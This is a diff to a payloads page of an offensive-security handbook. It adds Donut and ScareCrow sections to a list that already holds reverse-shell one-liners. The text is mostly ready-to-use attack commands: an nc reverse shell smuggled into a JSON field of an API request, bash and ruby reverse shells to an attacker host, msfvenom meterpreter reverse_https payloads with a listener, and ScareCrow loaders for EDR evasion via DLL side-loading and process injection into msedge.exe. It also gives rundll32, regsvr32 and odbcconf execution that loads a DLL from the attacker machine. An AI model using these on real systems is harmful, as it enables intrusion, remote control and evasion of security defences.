@@ -8,6 +8,7 @@
 - [Bad PDF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Bad-PDF)
 - [Bash Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Bash-Reverse-Shell)
 - [curl Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#curl-Reverse-Shell)
+- [Donut](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Donut)
 - [Exiftool](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Exiftool)
 - [GhostScript](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#GhostScript)
 - [GIF](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#GIF)
@@ -33,6 +34,7 @@
 - [Python Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Python-Reverse-Shell)
 - [Remote File Inclusion (RFI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Remote-File-Inclusion-RFI)
 - [Ruby Reverse Shell](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Ruby-Reverse-Shell)
+- [ScareCrow](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#ScareCrow)
 - [.SCF (Shell Command File) File](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#SCF-Shell-Command-File-File)
 - [Spoofing Office Marco](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Spoofing-Office-Macro)
 - [Server-Side Template Injection (SSTI)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/payloads.md#Server-Side-Template-Injection-SSTI)
@@ -187,6 +189,24 @@ $ curl --header "Content-Type: application/json" --request POST http://<RHOST>:<
 
 ```c
 $ curl -i -s -k -X $'POST' -H $'Host: api.<RHOST>' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzIyMjk2LCJleHAiOjE2MzI5MTQyOTZ9.y8GGfvwe1LPGOGJUVjmzMIsZaR5aok60X6fmEnAHvMg' -H $'Content-Type: application/json' -H $'Origin: http://api.<RHOST>' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f)\",\"port\":\"1337\"\}' $'http://api.<RHOST>/admin/plugins/install' --proxy http://127.0.0.1:8080
+```
+
+## Donut
+
+> https://github.com/TheWover/donut
+
+### Installation
+
+```c
+$ make
+$ make clean
+$ make debug
+```
+
+### Obfuscation
+
+```c
+$ donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
 ```
 
 ## Exiftool
@@ -634,6 +654,89 @@ exec("bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'");
 
 ```c
 $ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+## ScareCrow
+
+> https://github.com/Tylous/ScareCrow
+
+### Payloads
+
+#### Shellcode
+
+```c
+$ ScareCrow -I <FILE>.bin -Loader binary -domain <FAKE_DOMAIN>
+```
+
+#### Shellcode Payload Creation with msfvenom
+
+```c
+$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f raw -o <FILE>.bin
+```
+
+#### .msi-File Payload Creation with msfvenom
+
+```c
+$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f exe -o <FILE>.exe
+```
+
+#### Listener
+
+```c
+msf6 > use exploit/multi/handler
+msf6 > set payload windows/x64/meterpreter/reverse_https
+```
+
+### Obfuscation
+
+#### DLL Side-Loading
+
+```c
+$ ScareCrow -I <FILE>.bin -Loader dll -domain <FAKE_DOMAIN>
+```
+#### Windows Script Host
+
+```c
+$ ScareCrow -I <FILE>.bin -Loader msiexec -domain <FAKE_DOMAIN> -O payload.js
+```
+
+#### Control Panel Files
+
+```c
+$ ScareCrow -I <FILE>.bin -Loader control -domain <FAKE_DOMAIN>
+```
+
+#### Process Injection
+
+```c
+$ ScareCrow -I <FILE>.bin -injection "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" -domain <FAKE_DOMAIN>
+```
+
+### Renaming Payload
+
+```c
+$ mv <FILE>.dll <FILE>32.dll
+```
+
+### Execution
+
+```c
+PS C:\> rundll32.exe .\<FILE>32.dll,DllRegisterServer
+```
+
+or
+
+```c
+PS C:\> regsvr32 /s .\<FILE>32.dll
+```
+
+For `.cpl-Files` a simple double click is enough to execute them.
+
+### Evasion focused Execution
+
+```c
+PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>.dll}
+PS C:\> odbcconf /s /a {regsvr \\<LHOST>\<FILE>_dll.txt}
 ```
 
 ## .SCF (Shell Command File) File
